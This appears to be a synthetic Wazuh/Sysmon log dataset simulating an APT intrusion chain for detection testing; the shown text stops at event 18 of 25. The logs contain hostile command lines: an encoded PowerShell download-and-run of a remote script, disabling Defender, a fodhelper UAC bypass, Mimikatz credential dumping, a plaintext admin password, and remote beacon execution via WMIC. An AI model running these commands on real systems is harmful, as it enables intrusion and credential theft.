{
  "_metadata": {
    "name": "Full APT Intrusion Chain",
    "description": "Complete APT attack chain from phishing to exfiltration",
    "total_logs": 25,
    "kill_chain_phases": [
      "initial-access",
      "execution",
      "persistence",
      "defense-evasion",
      "privilege-escalation",
      "credential-access",
      "discovery",
      "lateral-movement",
      "collection",
      "exfiltration"
    ],
    "format": "wazuh-native",
    "format_version": "1.0"
  },
  "logs": [
    {
      "_comment": "Phase 1: Initial Access - Malicious document opened",
      "sequence": 1,
      "timestamp": "2026-01-29T08:00:00.000Z",
      "log": {
        "rule": {
          "level": 12,
          "description": "Sysmon - Event 1: Full APT Intrusion Chain",
          "id": "100100",
          "mitre": {
            "id": [
              "T0000"
            ],
            "tactic": [
              "Unknown"
            ],
            "technique": [
              "Full APT Intrusion Chain"
            ]
          },
          "firedtimes": 1,
          "mail": false,
          "groups": [
            "sysmon",
            "sysmon_event1",
            "windows"
          ]
        },
        "agent": {
          "id": "020",
          "name": "WS01",
          "ip": "198.51.100.20"
        },
        "manager": {
          "name": "wazuh.manager"
        },
        "id": "1700000000.638611270",
        "decoder": {
          "name": "windows_eventchannel"
        },
        "location": "EventChannel",
        "data": {
          "win": {
            "system": {
              "eventID": "1",
              "channel": "Microsoft-Windows-Sysmon/Operational",
              "providerName": "Microsoft-Windows-Sysmon",
              "computer": "WS01.corp.local",
              "level": "4",
              "task": "1",
              "opcode": "0",
              "keywords": "0x8000000000000000",
              "severityValue": "INFORMATION"
            },
            "eventdata": {
              "utcTime": "2026-01-29 08:00:00.000",
              "processGuid": "{APT-CHAIN-0001-0001-0001-000000000001}",
              "processId": "4520",
              "image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
              "commandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\john.doe\\Downloads\\Invoice_Q4_2025.docm\"",
              "currentDirectory": "C:\\Users\\john.doe\\Downloads\\",
              "user": "CORP\\john.doe",
              "integrityLevel": "Medium",
              "parentProcessGuid": "{APT-CHAIN-0000-0000-0000-000000000001}",
              "parentProcessId": "3892",
              "parentImage": "C:\\Windows\\explorer.exe",
              "parentCommandLine": "C:\\Windows\\Explorer.EXE"
            }
          }
        }
      }
    },
    {
      "_comment": "Phase 2: Execution - Word spawns PowerShell",
      "sequence": 2,
      "timestamp": "2026-01-29T08:00:05.000Z",
      "log": {
        "rule": {
          "level": 12,
          "description": "Sysmon - Event 1: Full APT Intrusion Chain",
          "id": "100100",
          "mitre": {
            "id": [
              "T0000"
            ],
            "tactic": [
              "Unknown"
            ],
            "technique": [
              "Full APT Intrusion Chain"
            ]
          },
          "firedtimes": 1,
          "mail": false,
          "groups": [
            "sysmon",
            "sysmon_event1",
            "windows"
          ]
        },
        "agent": {
          "id": "020",
          "name": "WS01",
          "ip": "198.51.100.20"
        },
        "manager": {
          "name": "wazuh.manager"
        },
        "id": "1700000000.427099003",
        "decoder": {
          "name": "windows_eventchannel"
        },
        "location": "EventChannel",
        "data": {
          "win": {
            "system": {
              "eventID": "1",
              "channel": "Microsoft-Windows-Sysmon/Operational",
              "providerName": "Microsoft-Windows-Sysmon",
              "computer": "WS01.corp.local",
              "level": "4",
              "task": "1",
              "opcode": "0",
              "keywords": "0x8000000000000000",
              "severityValue": "INFORMATION"
            },
            "eventdata": {
              "utcTime": "2026-01-29 08:00:05.000",
              "processGuid": "{APT-CHAIN-0001-0001-0001-000000000002}",
              "processId": "5678",
              "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
              "commandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADUAMAAuADEAMAAwAC8AcwB0AGEAZwBlADIALgBwAHMAMQAnACkA",
              "currentDirectory": "C:\\Users\\john.doe\\Downloads\\",
              "user": "CORP\\john.doe",
              "integrityLevel": "Medium",
              "parentProcessGuid": "{APT-CHAIN-0001-0001-0001-000000000001}",
              "parentProcessId": "4520",
              "parentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
              "parentCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\john.doe\\Downloads\\Invoice_Q4_2025.docm\""
            }
          }
        }
      }
    },
    {
      "_comment": "Phase 2: Execution - C2 connection",
      "sequence": 3,
      "timestamp": "2026-01-29T08:00:06.000Z",
      "log": {
        "rule": {
          "level": 12,
          "description": "Sysmon - Event 3: Full APT Intrusion Chain",
          "id": "100100",
          "mitre": {
            "id": [
              "T0000"
            ],
            "tactic": [
              "Unknown"
            ],
            "technique": [
              "Full APT Intrusion Chain"
            ]
          },
          "firedtimes": 1,
          "mail": false,
          "groups": [
            "sysmon",
            "sysmon_event3",
            "windows"
          ]
        },
        "agent": {
          "id": "020",
          "name": "WS01",
          "ip": "198.51.100.20"
        },
        "manager": {
          "name": "wazuh.manager"
        },
        "id": "1700000000.982014885",
        "decoder": {
          "name": "windows_eventchannel"
        },
        "location": "EventChannel",
        "data": {
          "win": {
            "system": {
              "eventID": "3",
              "channel": "Microsoft-Windows-Sysmon/Operational",
              "providerName": "Microsoft-Windows-Sysmon",
              "computer": "WS01.corp.local",
              "level": "4",
              "task": "1",
              "opcode": "0",
              "keywords": "0x8000000000000000",
              "severityValue": "INFORMATION"
            },
            "eventdata": {
              "utcTime": "2026-01-29 08:00:06.000",
              "processGuid": "{APT-CHAIN-0001-0001-0001-000000000002}",
              "processId": "5678",
              "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
              "user": "CORP\\john.doe",
              "protocol": "tcp",
              "initiated": "true",
              "sourceIp": "198.51.100.50",
              "sourcePort": "49721",
              "destinationIp": "198.51.100.100",
              "destinationPort": "80"
            }
          }
        }
      }
    },
    {
      "_comment": "Phase 3: Persistence - Registry run key",
      "sequence": 4,
      "timestamp": "2026-01-29T08:00:30.000Z",
      "log": {
        "rule": {
          "level": 12,
          "description": "Sysmon - Event 13: Full APT Intrusion Chain",
          "id": "100100",
          "mitre": {
            "id": [
              "T0000"
            ],
            "tactic": [
              "Unknown"
            ],
            "technique": [
              "Full APT Intrusion Chain"
            ]
          },
          "firedtimes": 1,
          "mail": false,
          "groups": [
            "sysmon",
            "sysmon_event13",
            "windows"
          ]
        },
        "agent": {
          "id": "020",
          "name": "WS01",
          "ip": "198.51.100.20"
        },
        "manager": {
          "name": "wazuh.manager"
        },
        "id": "1700000000.173700805",
        "decoder": {
          "name": "windows_eventchannel"
        },
        "location": "EventChannel",
        "data": {
          "win": {
            "system": {
              "eventID": "13",
              "channel": "Microsoft-Windows-Sysmon/Operational",
              "providerName": "Microsoft-Windows-Sysmon",
              "computer": "WS01.corp.local",
              "level": "4",
              "task": "1",
              "opcode": "0",
              "keywords": "0x8000000000000000",
              "severityValue": "INFORMATION"
            },
            "eventdata": {
              "utcTime": "2026-01-29 08:00:30.000",
              "eventType": "SetValue",
              "processGuid": "{APT-CHAIN-0001-0001-0001-000000000002}",
              "processId": "5678",
              "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
              "targetObject": "HKU\\S-1-5-21-1234567890-1234567890-1234567890-1001\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OneDriveSync",
              "details": "C:\\Users\\john.doe\\AppData\\Local\\Microsoft\\OneDrive\\sync.exe",
              "user": "CORP\\john.doe"
            }
          }
        }
      }
    },
    {
      "_comment": "Phase 4: Defense Evasion - Disable Defender",
      "sequence": 5,
      "timestamp": "2026-01-29T08:01:00.000Z",
      "log": {
        "rule": {
          "level": 12,
          "description": "Sysmon - Event 4104: Full APT Intrusion Chain",
          "id": "100100",
          "mitre": {
            "id": [
              "T0000"
            ],
            "tactic": [
              "Unknown"
            ],
            "technique": [
              "Full APT Intrusion Chain"
            ]
          },
          "firedtimes": 1,
          "mail": false,
          "groups": [
            "sysmon",
            "sysmon_event4104",
            "windows"
          ]
        },
        "agent": {
          "id": "020",
          "name": "WS01",
          "ip": "198.51.100.20"
        },
        "manager": {
          "name": "wazuh.manager"
        },
        "id": "1700000000.822946158",
        "decoder": {
          "name": "windows_eventchannel"
        },
        "location": "EventChannel",
        "data": {
          "win": {
            "system": {
              "eventID": "4104",
              "channel": "Microsoft-Windows-PowerShell/Operational",
              "providerName": "Microsoft-Windows-PowerShell",
              "computer": "WS01.corp.local",
              "level": "4",
              "task": "1",
              "opcode": "0",
              "keywords": "0x8000000000000000",
              "severityValue": "INFORMATION"
            },
            "eventdata": {
              "messageNumber": "1",
              "messageTotal": "1",
              "scriptBlockText": "Set-MpPreference -DisableRealtimeMonitoring $true",
              "scriptBlockId": "apt-chain-001-script-001",
              "path": ""
            }
          }
        }
      }
    },
    {
      "_comment": "Phase 5: Discovery - Local user enumeration",
      "sequence": 6,
      "timestamp": "2026-01-29T08:02:00.000Z",
      "log": {
        "rule": {
          "level": 12,
          "description": "Sysmon - Event 1: Full APT Intrusion Chain",
          "id": "100100",
          "mitre": {
            "id": [
              "T0000"
            ],
            "tactic": [
              "Unknown"
            ],
            "technique": [
              "Full APT Intrusion Chain"
            ]
          },
          "firedtimes": 1,
          "mail": false,
          "groups": [
            "sysmon",
            "sysmon_event1",
            "windows"
          ]
        },
        "agent": {
          "id": "020",
          "name": "WS01",
          "ip": "198.51.100.20"
        },
        "manager": {
          "name": "wazuh.manager"
        },
        "id": "1700000000.218788743",
        "decoder": {
          "name": "windows_eventchannel"
        },
        "location": "EventChannel",
        "data": {
          "win": {
            "system": {
              "eventID": "1",
              "channel": "Microsoft-Windows-Sysmon/Operational",
              "providerName": "Microsoft-Windows-Sysmon",
              "computer": "WS01.corp.local",
              "level": "4",
              "task": "1",
              "opcode": "0",
              "keywords": "0x8000000000000000",
              "severityValue": "INFORMATION"
            },
            "eventdata": {
              "utcTime": "2026-01-29 08:02:00.000",
              "processGuid": "{APT-CHAIN-0001-0001-0001-000000000003}",
              "processId": "6000",
              "image": "C:\\Windows\\System32\\net.exe",
              "commandLine": "net user",
              "currentDirectory": "C:\\Users\\john.doe\\",
              "user": "CORP\\john.doe",
              "integrityLevel": "Medium",
              "parentProcessGuid": "{APT-CHAIN-0001-0001-0001-000000000002}",
              "parentProcessId": "5678",
              "parentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
              "parentCommandLine": "powershell.exe"
            }
          }
        }
      }
    },
    {
      "_comment": "Phase 5: Discovery - System info",
      "sequence": 7,
      "timestamp": "2026-01-29T08:02:30.000Z",
      "log": {
        "rule": {
          "level": 12,
          "description": "Sysmon - Event 1: Full APT Intrusion Chain",
          "id": "100100",
          "mitre": {
            "id": [
              "T0000"
            ],
            "tactic": [
              "Unknown"
            ],
            "technique": [
              "Full APT Intrusion Chain"
            ]
          },
          "firedtimes": 1,
          "mail": false,
          "groups": [
            "sysmon",
            "sysmon_event1",
            "windows"
          ]
        },
        "agent": {
          "id": "020",
          "name": "WS01",
          "ip": "198.51.100.20"
        },
        "manager": {
          "name": "wazuh.manager"
        },
        "id": "1700000000.335553056",
        "decoder": {
          "name": "windows_eventchannel"
        },
        "location": "EventChannel",
        "data": {
          "win": {
            "system": {
              "eventID": "1",
              "channel": "Microsoft-Windows-Sysmon/Operational",
              "providerName": "Microsoft-Windows-Sysmon",
              "computer": "WS01.corp.local",
              "level": "4",
              "task": "1",
              "opcode": "0",
              "keywords": "0x8000000000000000",
              "severityValue": "INFORMATION"
            },
            "eventdata": {
              "utcTime": "2026-01-29 08:02:30.000",
              "processGuid": "{APT-CHAIN-0001-0001-0001-000000000004}",
              "processId": "6100",
              "image": "C:\\Windows\\System32\\systeminfo.exe",
              "commandLine": "systeminfo",
              "currentDirectory": "C:\\Users\\john.doe\\",
              "user": "CORP\\john.doe",
              "integrityLevel": "Medium",
              "parentProcessGuid": "{APT-CHAIN-0001-0001-0001-000000000002}",
              "parentProcessId": "5678",
              "parentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
              "parentCommandLine": "powershell.exe"
            }
          }
        }
      }
    },
    {
      "_comment": "Phase 6: Privilege Escalation - UAC Bypass setup",
      "sequence": 8,
      "timestamp": "2026-01-29T08:03:00.000Z",
      "log": {
        "rule": {
          "level": 12,
          "description": "Sysmon - Event 13: Full APT Intrusion Chain",
          "id": "100100",
          "mitre": {
            "id": [
              "T0000"
            ],
            "tactic": [
              "Unknown"
            ],
            "technique": [
              "Full APT Intrusion Chain"
            ]
          },
          "firedtimes": 1,
          "mail": false,
          "groups": [
            "sysmon",
            "sysmon_event13",
            "windows"
          ]
        },
        "agent": {
          "id": "020",
          "name": "WS01",
          "ip": "198.51.100.20"
        },
        "manager": {
          "name": "wazuh.manager"
        },
        "id": "1700000000.935052873",
        "decoder": {
          "name": "windows_eventchannel"
        },
        "location": "EventChannel",
        "data": {
          "win": {
            "system": {
              "eventID": "13",
              "channel": "Microsoft-Windows-Sysmon/Operational",
              "providerName": "Microsoft-Windows-Sysmon",
              "computer": "WS01.corp.local",
              "level": "4",
              "task": "1",
              "opcode": "0",
              "keywords": "0x8000000000000000",
              "severityValue": "INFORMATION"
            },
            "eventdata": {
              "utcTime": "2026-01-29 08:03:00.000",
              "eventType": "SetValue",
              "processGuid": "{APT-CHAIN-0001-0001-0001-000000000002}",
              "processId": "5678",
              "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
              "targetObject": "HKU\\S-1-5-21-1234567890-1234567890-1234567890-1001\\Software\\Classes\\ms-settings\\shell\\open\\command\\(Default)",
              "details": "C:\\Windows\\System32\\cmd.exe /c powershell.exe -ep bypass -file C:\\Users\\Public\\elevate.ps1",
              "user": "CORP\\john.doe"
            }
          }
        }
      }
    },
    {
      "_comment": "Phase 6: Privilege Escalation - fodhelper trigger",
      "sequence": 9,
      "timestamp": "2026-01-29T08:03:05.000Z",
      "log": {
        "rule": {
          "level": 12,
          "description": "Sysmon - Event 1: Full APT Intrusion Chain",
          "id": "100100",
          "mitre": {
            "id": [
              "T0000"
            ],
            "tactic": [
              "Unknown"
            ],
            "technique": [
              "Full APT Intrusion Chain"
            ]
          },
          "firedtimes": 1,
          "mail": false,
          "groups": [
            "sysmon",
            "sysmon_event1",
            "windows"
          ]
        },
        "agent": {
          "id": "020",
          "name": "WS01",
          "ip": "198.51.100.20"
        },
        "manager": {
          "name": "wazuh.manager"
        },
        "id": "1700000000.894004629",
        "decoder": {
          "name": "windows_eventchannel"
        },
        "location": "EventChannel",
        "data": {
          "win": {
            "system": {
              "eventID": "1",
              "channel": "Microsoft-Windows-Sysmon/Operational",
              "providerName": "Microsoft-Windows-Sysmon",
              "computer": "WS01.corp.local",
              "level": "4",
              "task": "1",
              "opcode": "0",
              "keywords": "0x8000000000000000",
              "severityValue": "INFORMATION"
            },
            "eventdata": {
              "utcTime": "2026-01-29 08:03:05.000",
              "processGuid": "{APT-CHAIN-0001-0001-0001-000000000005}",
              "processId": "6200",
              "image": "C:\\Windows\\System32\\fodhelper.exe",
              "commandLine": "C:\\Windows\\System32\\fodhelper.exe",
              "currentDirectory": "C:\\Users\\john.doe\\",
              "user": "CORP\\john.doe",
              "integrityLevel": "High",
              "parentProcessGuid": "{APT-CHAIN-0001-0001-0001-000000000002}",
              "parentProcessId": "5678",
              "parentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
              "parentCommandLine": "powershell.exe"
            }
          }
        }
      }
    },
    {
      "_comment": "Phase 6: Privilege Escalation - Elevated shell",
      "sequence": 10,
      "timestamp": "2026-01-29T08:03:06.000Z",
      "log": {
        "rule": {
          "level": 12,
          "description": "Sysmon - Event 1: Full APT Intrusion Chain",
          "id": "100100",
          "mitre": {
            "id": [
              "T0000"
            ],
            "tactic": [
              "Unknown"
            ],
            "technique": [
              "Full APT Intrusion Chain"
            ]
          },
          "firedtimes": 1,
          "mail": false,
          "groups": [
            "sysmon",
            "sysmon_event1",
            "windows"
          ]
        },
        "agent": {
          "id": "020",
          "name": "WS01",
          "ip": "198.51.100.20"
        },
        "manager": {
          "name": "wazuh.manager"
        },
        "id": "1700000000.83664122",
        "decoder": {
          "name": "windows_eventchannel"
        },
        "location": "EventChannel",
        "data": {
          "win": {
            "system": {
              "eventID": "1",
              "channel": "Microsoft-Windows-Sysmon/Operational",
              "providerName": "Microsoft-Windows-Sysmon",
              "computer": "WS01.corp.local",
              "level": "4",
              "task": "1",
              "opcode": "0",
              "keywords": "0x8000000000000000",
              "severityValue": "INFORMATION"
            },
            "eventdata": {
              "utcTime": "2026-01-29 08:03:06.000",
              "processGuid": "{APT-CHAIN-0001-0001-0001-000000000006}",
              "processId": "6300",
              "image": "C:\\Windows\\System32\\cmd.exe",
              "commandLine": "C:\\Windows\\System32\\cmd.exe /c powershell.exe -ep bypass -file C:\\Users\\Public\\elevate.ps1",
              "currentDirectory": "C:\\Users\\john.doe\\",
              "user": "CORP\\john.doe",
              "integrityLevel": "High",
              "parentProcessGuid": "{APT-CHAIN-0001-0001-0001-000000000005}",
              "parentProcessId": "6200",
              "parentImage": "C:\\Windows\\System32\\fodhelper.exe",
              "parentCommandLine": "C:\\Windows\\System32\\fodhelper.exe"
            }
          }
        }
      }
    },
    {
      "_comment": "Phase 7: Credential Access - Mimikatz execution",
      "sequence": 11,
      "timestamp": "2026-01-29T08:04:00.000Z",
      "log": {
        "rule": {
          "level": 12,
          "description": "Sysmon - Event 1: Full APT Intrusion Chain",
          "id": "100100",
          "mitre": {
            "id": [
              "T0000"
            ],
            "tactic": [
              "Unknown"
            ],
            "technique": [
              "Full APT Intrusion Chain"
            ]
          },
          "firedtimes": 1,
          "mail": false,
          "groups": [
            "sysmon",
            "sysmon_event1",
            "windows"
          ]
        },
        "agent": {
          "id": "020",
          "name": "WS01",
          "ip": "198.51.100.20"
        },
        "manager": {
          "name": "wazuh.manager"
        },
        "id": "1700000000.473409177",
        "decoder": {
          "name": "windows_eventchannel"
        },
        "location": "EventChannel",
        "data": {
          "win": {
            "system": {
              "eventID": "1",
              "channel": "Microsoft-Windows-Sysmon/Operational",
              "providerName": "Microsoft-Windows-Sysmon",
              "computer": "WS01.corp.local",
              "level": "4",
              "task": "1",
              "opcode": "0",
              "keywords": "0x8000000000000000",
              "severityValue": "INFORMATION"
            },
            "eventdata": {
              "utcTime": "2026-01-29 08:04:00.000",
              "processGuid": "{APT-CHAIN-0001-0001-0001-000000000007}",
              "processId": "6400",
              "image": "C:\\Users\\Public\\m64.exe",
              "commandLine": "m64.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"",
              "currentDirectory": "C:\\Users\\Public\\",
              "user": "CORP\\john.doe",
              "integrityLevel": "High",
              "parentProcessGuid": "{APT-CHAIN-0001-0001-0001-000000000006}",
              "parentProcessId": "6300",
              "parentImage": "C:\\Windows\\System32\\cmd.exe",
              "parentCommandLine": "cmd.exe"
            }
          }
        }
      }
    },
    {
      "_comment": "Phase 7: Credential Access - LSASS access",
      "sequence": 12,
      "timestamp": "2026-01-29T08:04:01.000Z",
      "log": {
        "rule": {
          "level": 12,
          "description": "Sysmon - Event 10: Full APT Intrusion Chain",
          "id": "100100",
          "mitre": {
            "id": [
              "T0000"
            ],
            "tactic": [
              "Unknown"
            ],
            "technique": [
              "Full APT Intrusion Chain"
            ]
          },
          "firedtimes": 1,
          "mail": false,
          "groups": [
            "sysmon",
            "sysmon_event10",
            "windows"
          ]
        },
        "agent": {
          "id": "020",
          "name": "WS01",
          "ip": "198.51.100.20"
        },
        "manager": {
          "name": "wazuh.manager"
        },
        "id": "1700000000.115911361",
        "decoder": {
          "name": "windows_eventchannel"
        },
        "location": "EventChannel",
        "data": {
          "win": {
            "system": {
              "eventID": "10",
              "channel": "Microsoft-Windows-Sysmon/Operational",
              "providerName": "Microsoft-Windows-Sysmon",
              "computer": "WS01.corp.local",
              "level": "4",
              "task": "1",
              "opcode": "0",
              "keywords": "0x8000000000000000",
              "severityValue": "INFORMATION"
            },
            "eventdata": {
              "utcTime": "2026-01-29 08:04:01.000",
              "sourceProcessGuid": "{APT-CHAIN-0001-0001-0001-000000000007}",
              "sourceProcessId": "6400",
              "sourceThreadId": "6404",
              "sourceImage": "C:\\Users\\Public\\m64.exe",
              "targetProcessGuid": "{APT-CHAIN-0000-0000-0000-LSASS0000001}",
              "targetProcessId": "728",
              "targetImage": "C:\\Windows\\System32\\lsass.exe",
              "grantedAccess": "0x1010",
              "callTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+9c4c4|C:\\Windows\\System32\\KERNELBASE.dll+29bb|C:\\Users\\Public\\m64.exe+6dc10"
            }
          }
        }
      }
    },
    {
      "_comment": "Phase 8: Discovery - Domain enumeration",
      "sequence": 13,
      "timestamp": "2026-01-29T08:05:00.000Z",
      "log": {
        "rule": {
          "level": 12,
          "description": "Sysmon - Event 1: Full APT Intrusion Chain",
          "id": "100100",
          "mitre": {
            "id": [
              "T0000"
            ],
            "tactic": [
              "Unknown"
            ],
            "technique": [
              "Full APT Intrusion Chain"
            ]
          },
          "firedtimes": 1,
          "mail": false,
          "groups": [
            "sysmon",
            "sysmon_event1",
            "windows"
          ]
        },
        "agent": {
          "id": "020",
          "name": "WS01",
          "ip": "198.51.100.20"
        },
        "manager": {
          "name": "wazuh.manager"
        },
        "id": "1700000000.425743982",
        "decoder": {
          "name": "windows_eventchannel"
        },
        "location": "EventChannel",
        "data": {
          "win": {
            "system": {
              "eventID": "1",
              "channel": "Microsoft-Windows-Sysmon/Operational",
              "providerName": "Microsoft-Windows-Sysmon",
              "computer": "WS01.corp.local",
              "level": "4",
              "task": "1",
              "opcode": "0",
              "keywords": "0x8000000000000000",
              "severityValue": "INFORMATION"
            },
            "eventdata": {
              "utcTime": "2026-01-29 08:05:00.000",
              "processGuid": "{APT-CHAIN-0001-0001-0001-000000000008}",
              "processId": "6500",
              "image": "C:\\Windows\\System32\\nltest.exe",
              "commandLine": "nltest /dclist:corp.local",
              "currentDirectory": "C:\\Users\\john.doe\\",
              "user": "CORP\\john.doe",
              "integrityLevel": "High",
              "parentProcessGuid": "{APT-CHAIN-0001-0001-0001-000000000006}",
              "parentProcessId": "6300",
              "parentImage": "C:\\Windows\\System32\\cmd.exe",
              "parentCommandLine": "cmd.exe"
            }
          }
        }
      }
    },
    {
      "_comment": "Phase 9: Lateral Movement - SMB share access",
      "sequence": 14,
      "timestamp": "2026-01-29T08:06:00.000Z",
      "log": {
        "rule": {
          "level": 12,
          "description": "Sysmon - Event 1: Full APT Intrusion Chain",
          "id": "100100",
          "mitre": {
            "id": [
              "T0000"
            ],
            "tactic": [
              "Unknown"
            ],
            "technique": [
              "Full APT Intrusion Chain"
            ]
          },
          "firedtimes": 1,
          "mail": false,
          "groups": [
            "sysmon",
            "sysmon_event1",
            "windows"
          ]
        },
        "agent": {
          "id": "020",
          "name": "WS01",
          "ip": "198.51.100.20"
        },
        "manager": {
          "name": "wazuh.manager"
        },
        "id": "1700000000.138367916",
        "decoder": {
          "name": "windows_eventchannel"
        },
        "location": "EventChannel",
        "data": {
          "win": {
            "system": {
              "eventID": "1",
              "channel": "Microsoft-Windows-Sysmon/Operational",
              "providerName": "Microsoft-Windows-Sysmon",
              "computer": "WS01.corp.local",
              "level": "4",
              "task": "1",
              "opcode": "0",
              "keywords": "0x8000000000000000",
              "severityValue": "INFORMATION"
            },
            "eventdata": {
              "utcTime": "2026-01-29 08:06:00.000",
              "processGuid": "{APT-CHAIN-0001-0001-0001-000000000009}",
              "processId": "6600",
              "image": "C:\\Windows\\System32\\net.exe",
              "commandLine": "net use \\\\DC01\\C$ /user:CORP\\admin.user Summer2025!",
              "currentDirectory": "C:\\Users\\john.doe\\",
              "user": "CORP\\john.doe",
              "integrityLevel": "High",
              "parentProcessGuid": "{APT-CHAIN-0001-0001-0001-000000000006}",
              "parentProcessId": "6300",
              "parentImage": "C:\\Windows\\System32\\cmd.exe",
              "parentCommandLine": "cmd.exe"
            }
          }
        }
      }
    },
    {
      "_comment": "Phase 9: Lateral Movement - SMB connection",
      "sequence": 15,
      "timestamp": "2026-01-29T08:06:01.000Z",
      "log": {
        "rule": {
          "level": 12,
          "description": "Sysmon - Event 3: Full APT Intrusion Chain",
          "id": "100100",
          "mitre": {
            "id": [
              "T0000"
            ],
            "tactic": [
              "Unknown"
            ],
            "technique": [
              "Full APT Intrusion Chain"
            ]
          },
          "firedtimes": 1,
          "mail": false,
          "groups": [
            "sysmon",
            "sysmon_event3",
            "windows"
          ]
        },
        "agent": {
          "id": "020",
          "name": "WS01",
          "ip": "198.51.100.20"
        },
        "manager": {
          "name": "wazuh.manager"
        },
        "id": "1700000000.868169241",
        "decoder": {
          "name": "windows_eventchannel"
        },
        "location": "EventChannel",
        "data": {
          "win": {
            "system": {
              "eventID": "3",
              "channel": "Microsoft-Windows-Sysmon/Operational",
              "providerName": "Microsoft-Windows-Sysmon",
              "computer": "WS01.corp.local",
              "level": "4",
              "task": "1",
              "opcode": "0",
              "keywords": "0x8000000000000000",
              "severityValue": "INFORMATION"
            },
            "eventdata": {
              "utcTime": "2026-01-29 08:06:01.000",
              "processGuid": "{APT-CHAIN-0001-0001-0001-000000000009}",
              "processId": "6600",
              "image": "C:\\Windows\\System32\\net.exe",
              "user": "CORP\\john.doe",
              "protocol": "tcp",
              "initiated": "true",
              "sourceIp": "198.51.100.50",
              "sourcePort": "50500",
              "destinationIp": "198.51.100.10",
              "destinationHostname": "DC01.corp.local",
              "destinationPort": "445"
            }
          }
        }
      }
    },
    {
      "_comment": "Phase 9: Lateral Movement - Copy payload",
      "sequence": 16,
      "timestamp": "2026-01-29T08:06:30.000Z",
      "log": {
        "rule": {
          "level": 12,
          "description": "Sysmon - Event 1: Full APT Intrusion Chain",
          "id": "100100",
          "mitre": {
            "id": [
              "T0000"
            ],
            "tactic": [
              "Unknown"
            ],
            "technique": [
              "Full APT Intrusion Chain"
            ]
          },
          "firedtimes": 1,
          "mail": false,
          "groups": [
            "sysmon",
            "sysmon_event1",
            "windows"
          ]
        },
        "agent": {
          "id": "020",
          "name": "WS01",
          "ip": "198.51.100.20"
        },
        "manager": {
          "name": "wazuh.manager"
        },
        "id": "1700000000.882521661",
        "decoder": {
          "name": "windows_eventchannel"
        },
        "location": "EventChannel",
        "data": {
          "win": {
            "system": {
              "eventID": "1",
              "channel": "Microsoft-Windows-Sysmon/Operational",
              "providerName": "Microsoft-Windows-Sysmon",
              "computer": "WS01.corp.local",
              "level": "4",
              "task": "1",
              "opcode": "0",
              "keywords": "0x8000000000000000",
              "severityValue": "INFORMATION"
            },
            "eventdata": {
              "utcTime": "2026-01-29 08:06:30.000",
              "processGuid": "{APT-CHAIN-0001-0001-0001-000000000010}",
              "processId": "6700",
              "image": "C:\\Windows\\System32\\cmd.exe",
              "commandLine": "cmd.exe /c copy C:\\Users\\Public\\beacon.exe \\\\DC01\\C$\\Windows\\Temp\\svchost.exe",
              "currentDirectory": "C:\\Users\\john.doe\\",
              "user": "CORP\\john.doe",
              "integrityLevel": "High",
              "parentProcessGuid": "{APT-CHAIN-0001-0001-0001-000000000006}",
              "parentProcessId": "6300",
              "parentImage": "C:\\Windows\\System32\\cmd.exe",
              "parentCommandLine": "cmd.exe"
            }
          }
        }
      }
    },
    {
      "_comment": "Phase 9: Lateral Movement - Remote WMI execution",
      "sequence": 17,
      "timestamp": "2026-01-29T08:07:00.000Z",
      "log": {
        "rule": {
          "level": 12,
          "description": "Sysmon - Event 1: Full APT Intrusion Chain",
          "id": "100100",
          "mitre": {
            "id": [
              "T0000"
            ],
            "tactic": [
              "Unknown"
            ],
            "technique": [
              "Full APT Intrusion Chain"
            ]
          },
          "firedtimes": 1,
          "mail": false,
          "groups": [
            "sysmon",
            "sysmon_event1",
            "windows"
          ]
        },
        "agent": {
          "id": "020",
          "name": "WS01",
          "ip": "198.51.100.20"
        },
        "manager": {
          "name": "wazuh.manager"
        },
        "id": "1700000000.691165685",
        "decoder": {
          "name": "windows_eventchannel"
        },
        "location": "EventChannel",
        "data": {
          "win": {
            "system": {
              "eventID": "1",
              "channel": "Microsoft-Windows-Sysmon/Operational",
              "providerName": "Microsoft-Windows-Sysmon",
              "computer": "WS01.corp.local",
              "level": "4",
              "task": "1",
              "opcode": "0",
              "keywords": "0x8000000000000000",
              "severityValue": "INFORMATION"
            },
            "eventdata": {
              "utcTime": "2026-01-29 08:07:00.000",
              "processGuid": "{APT-CHAIN-0001-0001-0001-000000000011}",
              "processId": "6800",
              "image": "C:\\Windows\\System32\\wbem\\wmic.exe",
              "commandLine": "wmic /node:DC01.corp.local process call create \"C:\\Windows\\Temp\\svchost.exe\"",
              "currentDirectory": "C:\\Users\\john.doe\\",
              "user": "CORP\\john.doe",
              "integrityLevel": "High",
              "parentProcessGuid": "{APT-CHAIN-0001-0001-0001-000000000006}",
              "parentProcessId": "6300",
              "parentImage": "C:\\Windows\\System32\\cmd.exe",
              "parentCommandLine": "cmd.exe"
            }
          }
        }
      }
    },
    {
      "_comment": "Phase 10: Collection - Archive files",
      "sequence": 18,
      "timestamp": "2026-01-29T08:08:00.000Z",
      "log": {
        "rule": {
          "level": 12,
          "description": "Sysmon - Event 1: Full APT Intrusion Chain",
          "id": "100100",
          "mitre": {
            "id": [
              "T0000"
            ],
            "tactic": [
              "Unknown"
            ],
            "technique": [
              "Full APT Intrusion Chain"
            ]
          },
          "firedtimes": 1,
          "mail": false,
          "groups": [
            "sysmon",
            "sysmon_event1",
